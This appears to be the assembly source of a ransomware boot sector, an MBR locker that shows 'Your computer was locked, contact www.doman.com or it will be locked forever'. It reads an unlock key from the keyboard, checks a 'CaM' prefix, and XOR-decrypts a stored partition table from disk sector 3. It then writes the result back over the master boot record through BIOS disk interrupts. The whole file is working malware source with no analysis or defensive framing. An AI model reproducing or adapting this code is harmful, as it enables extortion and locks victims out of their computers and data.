org 0x7c00

start:
	mov ax,cs
	mov ds,ax
	mov ss,ax
	mov es,ax
	mov sp,0x100

main:
	mov bp,Tips
	mov cx,Tips_len
	mov ax,0x1301
	mov bx,0x0c
	int 0x10

	mov ax,0xb800
	add ax,0x40
	mov ds,ax
	xor cx,cx
	xor bx,bx
	GetChar:
		xor ax,ax
		int 0x16
		cmp AL,0x8
		je back
		CMP al,0x0d
		je entry
		mov ah,2
		mov [bx],al
		mov [bx+1],ah
		xor al,al
		mov [bx+2],al
		add bx,2
		inc cx
		mov [cs:InputCnt],cx
	jmp GetChar
	back:
		sub bx,2
		dec cx
		mov [cs:InputCnt],cx
		xor ax,ax
		mov [bx],ax
		jmp GetChar
	entry:
		mov ax,cs
		mov es,ax
		xor bx,bx

		mov al,[ds:bx]
		cmp al,'C'
		jne key_err
		add bx,2
		mov al,[ds:bx]
		cmp al,'a'
		jne key_err
		add bx,2
		mov al,[ds:bx]
		cmp al,'M'
		jne key_err
		add bx,2

		mov cl,0xff
		mov ch,0
		mov [cs:XResult],ch
	calc_key:
			mov al,[ds:bx]
			cmp al,0
			je fixmbr
			xor[cs:XResult],al
			add bx,2
		loop calc_key
		fixmbr:
		mov ax,0x7e00
		mov es,ax
		xor bx,bx
		mov ah,0x2
		mov dl,0x80
		mov al,1
		mov dh,0
		mov ch,0
		mov cl,3
		int 0x13
		;不断
		mov bx,0x01bd
		xor ch,ch
		mov [es:bx],ch
		mov bx,0x01be
		mov cl,64
		decrypt:
			mov al,[es:bx]
			xor al,[cs:XResult]
			mov [es:bx],al
			inc bx
		loop decrypt
			xor bx,bx
			mov ah,0x3
			mov dl,0x80
			mov al,1;
			mov dh,0
			mov ch,0
			mov cl,1
			int 0x13
			jmp _REST
		key_err:
			mov bx,0xb800
			add bx,Tips_len
			mov al,'X'
			mov [es:bx],al
			mov cx,[cs:InputCnt]
			xor ax,ax
			kk:
			mov [bx],ax
			add bx,2
			loop kk
			jmp start

	_REST:
		mov ax,0xffff
		push ax
		mov ax,0
		push ax
		retf
	data:
	XResult:db 0
	InputCnt:db 0
	Tips: db "Your computer was locked, contact www.doman.com or it will be locked forever  YOUR LICENSE:aaaaaaaaaaaaaaaaa"
	Tips_len equ $-Tips
	times 510-($-$$) db 0xf
	dw 0xAA55